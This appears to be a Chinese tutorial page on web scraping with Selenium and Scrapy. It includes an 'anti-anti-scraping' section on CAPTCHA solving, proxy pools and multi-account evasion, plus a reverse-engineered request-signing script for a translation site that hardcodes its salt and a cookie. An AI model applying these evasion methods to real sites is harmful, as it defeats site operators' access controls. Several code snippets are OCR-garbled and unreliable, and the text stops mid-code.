ActionChains(browser)       # 声明actions对象actions.drag_and_drop(source,target)  # 拖拽元素的起点和终点actions.perform()  # 执行动作action.click_and_hold()    # 点击且长按，更多方法查看官方文档#案列，下拉滚动条到最底部执 selenium import webdriverbrowser = webdriver.Chrome()url = &quot;https://www.zhihu.com/explore&quot;browser.get(url)browser.execute_script(&quot;window.scrollTo(0,document.body.scrollHeight)&quot;) # 将进度条下拉到最底部（第一种）browser.execute_script(scroll(0,屏幕的高度))#（第二种）browser.execute_script(&quot;alert(&#x27;hello word&#x27;)&quot;)  # 弹出alert提示窗#案列from selenium import webdriverbrowser = webdriver.Chrome()url = &quot;https://www.zhihu.com/explore&quot;browser.get(url)&quot;&quot;&quot;WebElement常用属性:    get_attribute 获取属性值    text          获取文本值    id            获取节点id    location      获取节点在页面中的相对位置    tag_name      获取标签名称    size          获取节点大小(宽和高)&quot;&quot;&quot;# 获取属性logo = browser.find_element_by_id(&quot;zh-top-link-logo&quot;)  # 获取logo节点print(logo)  # 返回值为WebElement对象logo_class = logo.get_attribute(&quot;class&quot;)   # 获取zh-top-link-logo节点的class属性值print(logo_class)# 获取文本值text_Ele = browser.find_element_by_css_selector(&quot;.question_link&quot;) # 通过css选择器获取文本内容所在的标签text = text_Ele.text  # 取出标签内的文本内容print(text)# 获取ID 位置 标签名和大小test = browser.find_element_by_class_name(&quot;zu-top-add-question&quot;)print(test.id)       # 0bfe7ae6-ebd9-499a-8f4e-35ae34776687print(test.location) # &#123;&#x27;x&#x27;: 759, &#x27;y&#x27;: 7&#125;print(test.tag_name) # buttonprint(test.size)     # &#123;&#x27;height&#x27;: 32, &#x27;width&#x27;: 66&#125;#案列获取子页面from selenium import webdriverbrowser = webdriver.Chrome()url = &quot;https://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&quot;browser.get(url)&quot;&quot;&quot;网页中有一种节点叫做iframe，也就是子Frame，相当于页面的子页面，他的结构和外部网页的结构完全一致。selenium打开页面后,他默认是在父级Frame里面操作,而此时如果页面中还有子Frame，他是不能获取到子Frame里面的节点的，这时候就需要使用switch_to.frame()方法来切换Frame。&quot;&quot;&quot;browser.switch_to.frame(&quot;iframeResult&quot;)logo = browser.find_elements_by_class_name(&quot;logo&quot;)print(logo)# [&lt;selenium.webdriver.remote.webelement.WebElement (session=&quot;1ccb11403013c749ce9fceda50a00975&quot;, element=&quot;88e5924e-d655-44c3-a905-8af1947b9d86&quot;)&gt;]# 报错信息&quot;&quot;&quot; raise exception_class(message, screen, stacktrace)selenium.common.exceptions.NoSuchElementException: Message: no such element: Unable to locate element: &#123;&quot;method&quot;:&quot;css selector&quot;,&quot;selector&quot;:&quot;.aaa&quot;&#125;  (Session info: chrome=75.0.3770.142)#如果selenium没有在DOM中找到节点，将继续等待，超出设定事件后，则抛出找不到节点的异常。当查找节点而节点并没有立即出现的时候，隐式等待将等待一段时间在查找DOM，默认时间是0&quot;&quot;&quot;--------------------------显式等待------------------------# 显示等待from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECbrowser = webdriver.Chrome()browser.get(&quot;https://www.taobao.com/&quot;)wait = WebDriverWait(browser,2)input = wait.until(EC.presence_of_element_located((By.ID,&quot;q&quot;)))button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,&quot;.btn-search&quot;)))print(input,button)# 等待条件# EC.presence_of_element_located   节点出现# EC.element_to_be_clickable       可点击# 更多等待条件查看260页&quot;&quot;&quot;引入WebDriverWait对象指定最长等待时间,调用它的until方法,传入要等待的条件expected_conditions,比如这里传入例如presence_of_element_located这个条件,代表节点出现的意思,其参数是节点的定位元组,也就是ID为q的搜索框。这样可以做到的效果就是,在10秒内如果ID为q的节点(即搜索框)成功加载出来,就返回该节点,如果10秒还没有加载出来,就抛出异常。&quot;&quot;&quot;&quot;&quot;&quot;异常:TimeoutException&quot;&quot;&quot;&quot;&quot;&quot;指定要查找的节点,然后指定一个最长等待时间,如果在规定时间内加载出来了这个节点,就返回查找的节点,如果到了规定时间依然没有加载出该节点,则抛出【超时】异常&quot;&quot;&quot;#案例import timefrom selenium import webdriverbrowser = webdriver.Chrome()browser.get(&quot;https://www.baidu.com&quot;)browser.get(&quot;https://www.taobao.com&quot;)browser.get(&quot;https://www.jd.com&quot;)browser.back()  # 后退time.sleep(2)browser.forward() # 前进browser.close()  # 关闭浏览器# 连续访问三个页面from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&quot;https://www.zhihu.com/explore&quot;)cookies = browser.get_cookies()  # 获取cookiesprint(cookies)browser.add_cookie(&#123;&quot;name&quot;:&quot;name&quot;,&quot;domain&quot;:&quot;www.zhihu.com&quot;,&quot;vlue&quot;:&quot;germey&quot;&#125;)browser.delete_all_cookies()  # 删除所有cookies#案例import timefrom selenium import webdriverbrowser = webdriver.Chrome()browser.get(&quot;https://www.baidu.com&quot;)browser.execute_script(&quot;window.open()&quot;)print(browser.window_handles)# [&#x27;CDwindow-7106D94FF002752ADF198B986343E31D&#x27;, &#x27;CDwindow-B669BA9559DBB78D8D6EC9C5AA699C40&#x27;]browser.switch_to.window(browser.window_handles[1])browser.get(&quot;https://www.taobao.com&quot;)time.sleep(1)browser.switch_to.window(browser.window_handles[0])browser.get(&quot;https://jd.com&quot;)&quot;&quot;&quot;1、打开百度网页2、新开一个选项卡,调用execute_script()方法传入JavaScript语法window.open()3、切换到新打开的选项卡,调用window_handles属性获取当前开启的所有选项卡,返回的是选项卡的代号列表,要想切换选项卡只需要调用switch_to.window()方法,这里我们将第二个选项卡代号传入,即跳转到第二个选项卡,在第二个选项卡里打开新页面https://www.taobao.com,然后切换回第一个选项卡打开jd页面&quot;&quot;&quot;复制代码异常处理#复制代码from selenium import webdriverbrowser = webdriver.Chrome()browser.get(&quot;https://www.baidu.com&quot;)try:    browser.find_element_by_id(&quot;hello&quot;)except Exception as e:    print(e)   # 打印错误信息 Exception捕获所有错误信息赋给efinally:    browser.close()&quot;&quot;&quot;在使用selenium的过程中,难免遇到一些异常,例如超时、节点未找到错误，一旦出现此类错误,程序便不会在继续运行了,这里我们使用try except语句来捕获各种异常&quot;&quot;&quot;#案列import timefrom selenium import webdriverfrom selenium.webdriver import ChromeOptionsoption = ChromeOptions()browser = webdriver.Chrome(executable_path=&#x27;D:\chromedriver.exe&#x27;,options=option)   # 声明一个浏览器对象   option.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-automation&#x27;])browser.get(&quot;https://www.baidu.com&quot;)  # 打开Chromeinput = browser.find_element_by_id(&quot;kw&quot;)  # 通过id定位到input框input.send_keys(&quot;爱奇艺&quot;)   # 在输入框内输入pythonbrowser.find_element_by_id(&quot;su&quot;).click()time.sleep(3)browser.find_element_by_xpath(&#x27;//*[@id=&quot;1&quot;]/h3&#x27;).click()time.sleep(10)browser.switch_to_window(browser.window_handles[1])  # 切换到新打开的选项卡定位爱奇艺的搜索框search = browser.find_element_by_xpath(&quot;//input[@class=&#x27;search-box-input&#x27;]&quot;).send_keys(&quot;青春有你&quot;)browser.close()               # 关闭浏览器#案列from selenium import webdriverfrom selenium.webdriver.chrome.options import Options# 创建chrome参数对象opt = Options()# 把chrome设置成无界面模式，不论windows还是linux都可以，自动适配对应参数opt.add_argument(&#x27;--headless&#x27;)# 创建chrome无界面对象driver = webdriver.Chrome(options=opt)driver.get(&quot;http://www.baidu.com&quot;)print(driver.page_source)</span></span><br></pre></td></tr></table></figure>







<h2 id="回顾："><a href="#回顾：" class="headerlink" title="回顾："></a>回顾：</h2><p>采集静态网页和动态网页</p>
<h2 id="scrapy框架"><a href="#scrapy框架" class="headerlink" title="scrapy框架"></a>scrapy框架</h2><p>架构图</p>
<p><img src="https://upload-images.jianshu.io/upload_images/12983160-796fd5bfb38a39ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/12983160-796fd5bfb38a39ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>
<p>了解框架的每个部分的功能：</p>
<h3 id="Scrapy-Engine（引擎）："><a href="#Scrapy-Engine（引擎）：" class="headerlink" title="Scrapy Engine（引擎）："></a>Scrapy Engine（引擎）：</h3><p>​        负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。</p>
<h3 id="Scheduler-调度器"><a href="#Scheduler-调度器" class="headerlink" title="Scheduler(调度器):"></a>Scheduler(调度器):</h3><p>​        它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。</p>
<h3 id="Downloader（下载器）："><a href="#Downloader（下载器）：" class="headerlink" title="Downloader（下载器）："></a>Downloader（下载器）：</h3><p>​        负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理.</p>
<h3 id="Spider（爬虫）文件："><a href="#Spider（爬虫）文件：" class="headerlink" title="Spider（爬虫）文件："></a>Spider（爬虫）文件：</h3><p>​        它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器).</p>
<h3 id="Item-Pipeline-管道-："><a href="#Item-Pipeline-管道-：" class="headerlink" title="Item Pipeline(管道)："></a>Item Pipeline(管道)：</h3><p>​        它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方.</p>
<h3 id="Downloader-Middlewares（下载中间件）："><a href="#Downloader-Middlewares（下载中间件）：" class="headerlink" title="Downloader Middlewares（下载中间件）："></a>Downloader Middlewares（下载中间件）：</h3><p>​        你可以当作是一个可以自定义扩展下载功能的组件。</p>
<h3 id="Spider-Middlewares（Spider中间件）："><a href="#Spider-Middlewares（Spider中间件）：" class="headerlink" title="Spider Middlewares（Spider中间件）："></a>Spider Middlewares（Spider中间件）：</h3><p>​        你可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件.</p>
<p><img src="https://upload-images.jianshu.io/upload_images/12983160-394d93c87390c455.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1110/format/webp" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/12983160-394d93c87390c455.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1110/format/webp" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>
<h3 id="创建Scrapy项目"><a href="#创建Scrapy项目" class="headerlink" title="创建Scrapy项目"></a>创建Scrapy项目</h3><p>安装库：pip install scrapy  或者 conda install scrapy</p>
<p>进行项目创建：scrapy startproject demo 后面的demo是项目名称</p>
<h3 id="了解项目相关配置文件："><a href="#了解项目相关配置文件：" class="headerlink" title="了解项目相关配置文件："></a>了解项目相关配置文件：</h3><p>spiders文件夹：创建Scrapy项目自动创建一个文件夹，用于存放用户编写爬虫脚本</p>
<p>items.py：定义爬虫程序的数据模型 （数据的字段）</p>
<p>middlewares.py:定义数据模型中的中间件（自定义扩展的功能）</p>
<p>pipelines.py:管道文件 负责对爬虫返回数据的处理（分析 过滤 存储等）</p>
<p>settings.py:爬虫程序设置文件 主要是一些优先性设置，优先级越高值越小</p>
<p>scrapy.cfg:内容为scrapy的基础</p>
<h4 id="中间事件："><a href="#中间事件：" class="headerlink" title="中间事件："></a>中间事件：</h4><p>显示指定类型的日志信息</p>
<p>LOG_LEVEL =’ERROR’</p>
<p>只看到错误信息和打印的内容</p>
<p>LOG_LEVEL=’WARNING’ </p>
<p>response.xpath(‘’)返回的是一个列表对象，需要用extract()提取出来</p>
<p>当只有一个元素时，可以用extract_tirst(),直接返回一个字符串</p>
<p><img src="C:\Users\Administrator\Desktop\360截图20210608210912698.jpg" class="lazyload" data-srcset="C:\Users\Administrator\Desktop\360截图20210608210912698.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="360截图20210608210912698"></p>
<p>在一个函数里可以写多个回调yield 且可以回调给自己，一般用于翻页时</p>
<p>当不在一个函数调用item时，最好用到函数copy.deepcopy(item)深拷贝，避免重复</p>
<p>import copy</p>
<h4 id="请求传参，当需要的数据不在一个网页，需要在下一个网页时，就可以用请求传参"><a href="#请求传参，当需要的数据不在一个网页，需要在下一个网页时，就可以用请求传参" class="headerlink" title="请求传参，当需要的数据不在一个网页，需要在下一个网页时，就可以用请求传参"></a>请求传参，当需要的数据不在一个网页，需要在下一个网页时，就可以用请求传参</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> （<span class="title">BossSpiderlscrapy</span>.<span class="title">Spider</span>) :</span>    name = <span class="string">&#x27; boss&#x27;</span>    <span class="comment">#allowed_ domains = [ &quot; www. xxx. com &#x27; ]    start urls = [&#x27;https:/ /www. zhipin. com/ job_ detail/ ?que ry=python&amp;c ity=101010100&amp;indus                                 def parse(self, response) :    li_ list = response . xpath( &#x27; //* [@id=&quot;main&quot;]/div/div[3]/ul/li&#x27; )    for li in li_ list:    item = BossproItem( )    #一级页面需要的内容    item[&#x27;job_ name&#x27;] = li. xpath( &#x27;.//div [@class=&quot;info-prima ry&quot;]/h3/a/div[1]/text()&#x27;) .extract()     #item[&#x27;job_ name&#x27; ] = job_ name    # print( job_ name )      #二级页面路径                 detail_ url = &#x27; https:/ /www. zhipin. com &#x27;+li. xpath( &#x27; .//div [@class=&quot; info-prima ry#对详情页发请求		获取详情页的页面源码数据    #手动请求的发送    #进请求传参i meta=ften 可以将meta字典传递给请求对应的回调函数    yield scrapy.Reauest(detail_url,callback = self.parse_detail,meta= &#123;&#x27;item&#x27; : item&#125;)                                                               #回调函数接受itemdef parse_detail(self, response) :    item = response.meta[&#x27;item&#x27;]     #二级页面所需要的东西                                                          item[&#x27;job_ desc&#x27;] =&quot;&quot;.join(response.xpath(&#x27;//[@id=&quot;main&quot;]/div[3]/div/div[2]/div[2]/div[1]/div/)).extract()     #job_ desc =&#x27;&#x27;.join(job_ desc)	# print(job_ desc)	#item[&#x27;job_ desc&#x27;] = job_ desc     yield item	  </span></span><br></pre></td></tr></table></figure>

<h3 id="持久化存储："><a href="#持久化存储：" class="headerlink" title="持久化存储："></a>持久化存储：</h3><h4 id="1、基于终端指令："><a href="#1、基于终端指令：" class="headerlink" title="1、基于终端指令："></a>1、基于终端指令：</h4><p>​        特点：只可以将parse方法rerutn（返回）的值，存储在本地的文件中；一般是用列表套字典的形式存储。存储的方式在cmd面板中输入scrapy crawl  爬虫名 -o ./名字.csv(类型有：json、jsonlines,csv,xml,marshal,paickle)</p>
<h4 id="2、基于管道："><a href="#2、基于管道：" class="headerlink" title="2、基于管道："></a>2、基于管道：</h4><p>​        item中定义属性，然后在提交给管道持久化存储:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QiubaiproPipe</span> <span class="title">Line</span> (<span class="params"><span class="built_in">object</span></span>):</span>    fp = <span class="literal">None</span>    并重写父类的一个方法:该方法只在开始爬虫的时候被调用一次    defm apen spider(selfaspiderli    <span class="comment">#print( &#x27;开始爬虫....... )    self.fp = open(&#x27; ./giubai. txt&#x27;。&#x27;w&#x27; zencoding=&#x27;utf-8&#x27; )    #专门用来处理item类型对象    #该方法可以接收爬虫文件提交过来的item对象进该方法没接收到-个item就会被调用一次    def process_ item(self, item, spider) :    authar = item [ &#x27; author&#x27; ]    content= item[ &#x27; content&#x27;]    self. fp. write( author+&#x27; : &#x27;+content+&#x27;\n&#x27; )    return item    def close_ spider(self,spider) :        #关闭文件       self.fp.close()#另一种import pandas as pd #模块class DiannaoPipeline:    def process_item(self, item, spider):        data = pd.DataFrame(dict(item))        data.to_csv(&#x27;电脑.csv&#x27;,mode=&#x27;a&#x27;,index=False,header=False,sep=&#x27;,&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>当爬取图片时，第一个页面只需解析出图片路径，在管道内设置如下：，重新创建类，需要在配置里去启动；</p>
<p><img src="C:\Users\Administrator\Desktop\管道.jpg" class="lazyload" data-srcset="C:\Users\Administrator\Desktop\管道.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="管道"></p>
<p>然后在在配置文件里去设置保存路径：</p>
<p><img src="C:\Users\Administrator\Desktop\360截图20210617215642741.jpg" class="lazyload" data-srcset="C:\Users\Administrator\Desktop\360截图20210617215642741.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="360截图20210617215642741"></p>
<h3 id="Scrapy编写步骤："><a href="#Scrapy编写步骤：" class="headerlink" title="Scrapy编写步骤："></a>Scrapy编写步骤：</h3><h4 id="1-定义采集数据模型"><a href="#1-定义采集数据模型" class="headerlink" title="1.定义采集数据模型"></a>1.定义采集数据模型</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Define here the models for your scraped items## See documentation in:# https://docs.scrapy.org/en/latest/topics/items.htmlimport scrapyclass DemoItem(scrapy.Item):    # define the fields for your item here like:    # name = scrapy.Field()    # 标题    title = scrapy.Field()    # 时间    date = scrapy.Field()    # 作者    author = scrapy.Field()    # 浏览次数    view_count = scrapy.Field()</span></span><br></pre></td></tr></table></figure>

<h4 id="2-编写spider脚本"><a href="#2-编写spider脚本" class="headerlink" title="2.编写spider脚本"></a>2.编写spider脚本</h4><p>命令 进入编写脚本的文件夹中：cd 命令</p>
<p>输入创建命令：scrapy genspider [项目名]tipdm  [连接地址]<a href="http://www.tipdm.com/">http://www.tipdm.com/</a></p>
<h4 id="3-启动框架命令"><a href="#3-启动框架命令" class="headerlink" title="3.启动框架命令"></a>3.启动框架命令</h4><p>scrapy crawl 项目名   ——- 项目运行</p>
<h4 id="4-保存数据（分析-清洗等）"><a href="#4-保存数据（分析-清洗等）" class="headerlink" title="4.保存数据（分析/清洗等）"></a>4.保存数据（分析/清洗等）</h4><h4 id="5-设置配置信息"><a href="#5-设置配置信息" class="headerlink" title="5.设置配置信息"></a>5.设置配置信息</h4><h3 id="定制中间件"><a href="#定制中间件" class="headerlink" title="定制中间件"></a>定制中间件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_agent_list = [    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1&quot;</span>,    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0&quot;</span>,    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&quot;</span>,    <span class="string">&quot;Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.9.168 Version/11.50&quot;</span>,    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 QQBrowser/6.9.11079.201&quot;</span>,    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)&quot;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;ip_port&#x27;</span>: <span class="string">&#x27;111.8.60.9:8123&#x27;</span>, <span class="string">&#x27;user_passwd&#x27;</span>: <span class="string">&#x27;user1:pass1&#x27;</span>&#125;,&#123;<span class="string">&#x27;ip_port&#x27;</span>: <span class="string">&#x27;101.71.27.120:80&#x27;</span>, <span class="string">&#x27;user_passwd&#x27;</span>: <span class="string">&#x27;user2   :pass2&#x27;</span>&#125;,&#123;<span class="string">&#x27;ip_port&#x27;</span>: <span class="string">&#x27;122.96.59.104:80&#x27;</span>, <span class="string">&#x27;user_passwd&#x27;</span>: <span class="string">&#x27;user3:pass3&#x27;</span>&#125;,&#123;<span class="string">&#x27;ip_port&#x27;</span>: <span class="string">&#x27;122.224.249.122:8088&#x27;</span>, <span class="string">&#x27;user_passwd&#x27;</span>: <span class="string">&#x27;user4:pass4&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h5 id="思考：现在通过的scrapy框架采集的静态网页，那么我们要采集动态网页？-scrapy-selenium运用"><a href="#思考：现在通过的scrapy框架采集的静态网页，那么我们要采集动态网页？-scrapy-selenium运用" class="headerlink" title="思考：现在通过的scrapy框架采集的静态网页，那么我们要采集动态网页？ scrapy + selenium运用"></a>思考：现在通过的scrapy框架采集的静态网页，那么我们要采集动态网页？ scrapy + selenium运用</h5><p>作业：通过已学过的知</p>
<p>识去扩展，利用scrapy框架+selenium去采集动态网页数据。保存到csv、json、txt</p>
<h2 id="一、爬虫的反反爬虫方案"><a href="#一、爬虫的反反爬虫方案" class="headerlink" title="一、爬虫的反反爬虫方案"></a>一、爬虫的反反爬虫方案</h2><h3 id="1-通过浏览器的方式访问"><a href="#1-通过浏览器的方式访问" class="headerlink" title="1.通过浏览器的方式访问"></a>1.通过浏览器的方式访问</h3><p>解决方案：携带参数，模拟浏览器进行访问。需要注意的字段：User-Agent，属性值正常范围。</p>
<h3 id="2-ip限制"><a href="#2-ip限制" class="headerlink" title="2.ip限制"></a>2.ip限制</h3><p>如果一个固定的ip在短暂的时间，快速大量的访问一个网站，后台的管理员可以编写ip限制，不让修改ip就不能访问。</p>
<p>解决方案：IP代理池</p>
<h3 id="3-session访问限制"><a href="#3-session访问限制" class="headerlink" title="3.session访问限制"></a>3.session访问限制</h3><p>后台统计登录的操作，比如短时间的点击事件，请求数据事情，与正常进行对比，用于区分用户是否处理异常状态，如果是，则限制登录用户的权限，需要添加数据的操作，阈值设置不好，容易造成错误操作。</p>
<p>解决方案：注册多个账号，模拟多个ip，模拟正常的操作</p>
<h3 id="4-验证码限制"><a href="#4-验证码限制" class="headerlink" title="4.验证码限制"></a>4.验证码限制</h3><p>a) 图片验证码</p>
<p>复杂型：找出同类别的图片</p>
<p>解决方案：平台雇佣人力，专门帮人识别验证码，识别完后结果传回去。总共的操作几秒钟的时间。打码平台具有记忆功能。图片被识别后“鞋子”，那么下次这张图片再次出现的时候，就会自动判断它是”鞋子”。</p>
<p>b) 简单型：数字+字母</p>
<p>解决方案：可以直接使用OCR识别技术（利用第三方库pytesseract）来识别.</p>
<p>背景比较清晰，识别没有任何问题。如果背景比较模糊，那么需要进行灰度处理。</p>
<p>c) 短信验证码</p>
<p>用webbrowser技术，模拟用户打开短信的行为，最终获取验证码。</p>
<p>d） 滑动验证码</p>
<p>对于滑动验证码，可以利用图片的像素作为线索，确定好基本的属性值，查看位置的差值，对于差值超过基本的属性值，我们就能大概确定图片的位置。</p>
<p>e） 计算图片验证码</p>
<p>数据计算也有可能是汉字计算，保存为黑白图，把验证码按照字体颜色二值化，去出噪点，然后将所有图片异常进行像素对比，计算出相似的值，找出最像的那张图片。</p>
<p>f） 倒立文字验证码</p>
<p>有8个汉字，倒立，扭曲</p>
<p>方案：首先确定前两个倒立的文字，可以确定后面8个文字的左边，验证码中的8个文字的位置确定。只需要提出确定每个汉字所在的坐标将其存入列表中。然后交个人工确定倒立文字的序号，将列表中的序号对应到坐标可以实现。 接入第三方平台，实现破解网站的验证码</p>
<p>g） 文字的点击顺序</p>
<p>方案：确定坐标，根据提示的顺序进行点击</p>
<p>h）绘制图案验证码</p>
<p>每次拖动的顺序不一样，结果也不一样。</p>
<p>利用机器学习所有的拖动顺序，利用1万张图片进行训练，完成类似人的操作，最终识别。</p>
<p>也可以利用selenium技术来模拟人的操作顺序</p>
<h3 id="5-动态数据的加载"><a href="#5-动态数据的加载" class="headerlink" title="5.动态数据的加载"></a>5.动态数据的加载</h3><p>可以利用selenium、json文件</p>
<h3 id="6-数据加密–-使用加密的算法"><a href="#6-数据加密–-使用加密的算法" class="headerlink" title="6.数据加密– 使用加密的算法"></a>6.数据加密– 使用加密的算法</h3><p>前段加密：通过查询的参数、user-agent、验证码、cookie等前段数据进行加密生成一串加密的指令。将指令作为参数，再次进行服务器请求。该加密的参数为空或者错误，服务器就不响应数据。</p>
<p>服务器加密：在服务端同样有一段加密的逻辑，生成一串编码，与请求的编码进行匹配，匹配通过则返回数据。</p>
<p>解决方案：js加密破解方式，就是找到js的加密的代码，然后通过第三方库js2py在python中运行js代码，就能获取到相应的编码。</p>
<h2 id="二、简单的验证码识别-JS逆向"><a href="#二、简单的验证码识别-JS逆向" class="headerlink" title="二、简单的验证码识别+JS逆向"></a>二、简单的验证码识别+JS逆向</h2><h3 id="a-验证码识别"><a href="#a-验证码识别" class="headerlink" title="a) 验证码识别"></a>a) 验证码识别</h3><p>安装机器视觉的工具 Tesseract</p>
<p>tesseract是一套流行的OCT算法,专门做图片内容识别。我们只需要下载相应的训练数据就能使用teserract进行图片内容读取。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入库import pytesseractfrom PIL import Imageimage = Image.open(&#x27;code.jpg&#x27;)# res = pytesseract.image_to_string(image)# print(res)# 对图片进行灰度处理image = image.convert(&#x27;L&#x27;)# 加载图片data = image.load()w,h = image.size # ndarryfor i in range(w):    for j in range(h):        if data[i,j] &gt; 40:            data[i,j] = 255        else:            data[i,j] = 0image.show()res = pytesseract.image_to_string(image)print(res)</span></span><br></pre></td></tr></table></figure>

<p>b) JS逆向</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目标地址：https://fanyi.youdao.com/# https://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=rule# e：输入翻译内容# ts:当前时间戳字符串# bv：将user-agent经过md5加密后的字符串# salt：时间戳字符串拼接随机数# sign：将&quot;fanyideskweb&quot; + e + i+ &quot;Tbh5E8=q6U3EXe+&amp;L[4c@&quot;import randomimport timeimport hashlibimport requestsclass Youdao(object):    def __init__(self, word):        # 初始化        self.url = &quot;https://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=rule&quot;        # 请求头信息        self.headers = &#123;            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36&quot;,            &quot;Cookie&quot;: &quot;OUTFOX_SEARCH_USER_ID=-1132106333@10.169.0.83; OUTFOX_SEARCH_USER_ID_NCOO=1946771786.421294; JSESSIONID=aaacAtoZRHi0Ud08zLvNx; ___rl__test__cookies=1622786844607&quot;,            &quot;Referer&quot;: &quot;https://fanyi.youdao.com /&quot;        &#125;        # 翻译内容        self.word = word        # 定义字典存储表单数据        self.post_boyd = &#123;&#125;    def genrator_post(self):        # 得到ts 拿到时间戳        ts = str(int(time.time()*1000))        # 得到salt 时间戳 + 一个随机的值        salt = ts + str(random.randint(0,10))        # 得到sign  字符串 + 陪翻译的值 + 盐值        sign_str = &quot;fanyideskweb&quot; + self.word + salt + 					                      &quot;Tbh5E8=q6U3EXe+&amp;L[4c@&quot;        # 将sign_str md5进行加密        md5 = hashlib.md5()        md5.update(sign_str.encode())        sign = md5.hexdigest()        # 生成数据信息        self.post_boyd = &#123;            &quot;i&quot;: self.word,            &quot;from&quot;: &quot;AUTO&quot;,            &quot;to&quot;: &quot;AUTO&quot;,            &quot;smartresult&quot;: &quot;dict&quot;,            &quot;client&quot;: &quot;fanyideskweb&quot;,            &quot;salt&quot;: salt,            &quot;sign&quot;: sign,            &quot;lts&quot;: ts,            &quot;bv&quot;: &quot;960780974768cef6d5005081d3d340f0&quot;,            &quot;doctype&quot;: &quot;json&quot;,            &quot;version&quot;: &quot;2.1&quot;,            &quot;keyfrom&quot;: &quot;fanyi.web&quot;,            &quot;action&quot;: &quot;FY_BY_REALTlME&quot;        &#125;    # 请求方法    def send_request(self):        # 发送请求        response =requests.post(self.url,headers=self.headers,data=self.post_boyd)        return response.json()    # 解析方法    def parser_response(self,ret_dict):        ret  = 